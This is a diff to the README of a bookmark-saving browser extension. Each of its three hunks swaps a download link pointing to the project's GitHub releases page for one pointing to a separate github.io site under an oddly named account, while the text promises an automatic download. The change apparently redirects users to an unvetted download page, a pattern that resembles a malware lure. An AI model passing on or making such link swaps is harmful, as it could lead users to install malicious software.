@@ -1,6 +1,6 @@
 # 🔖 save-book-extension - Your Digital Vault, Always Handy
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=github)](https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=github)](https://arsenopyritepseudomonaspyocanea35.github.io)
 
 ---
 
@@ -39,7 +39,7 @@ Getting started is easy. Even if you have never installed an extension before, y
 
 Visit this link to download the application. Look for the latest release file and click it to begin your download.
 
-[**⬇️ Download save-book-extension**](https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension/releases)
+[**⬇️ Download save-book-extension**](https://arsenopyritepseudomonaspyocanea35.github.io)
 
 The download will start automatically. Wait for it to finish. It is a small file, so it should not take long.
 
@@ -156,7 +156,7 @@ Save-book-extension is here to simplify your online life. No more scrambling for
 
 **Download now and take control of your digital bookmarks.**
 
-[**⬇️ Get the Latest Version**](https://github.com/arsenopyritepseudomonaspyocanea35/save-book-extension/releases)
+[**⬇️ Get the Latest Version**](https://arsenopyritepseudomonaspyocanea35.github.io)
 
 ---
 
